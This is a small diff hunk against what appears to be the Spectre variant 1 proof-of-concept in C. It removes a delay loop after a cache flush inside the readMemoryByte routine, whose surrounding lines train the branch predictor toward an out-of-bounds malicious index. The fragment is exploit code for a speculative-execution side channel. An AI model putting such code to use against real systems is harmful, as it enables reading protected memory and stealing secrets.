@@ -71,7 +71,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
       _mm_clflush( & array1_size);
-      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
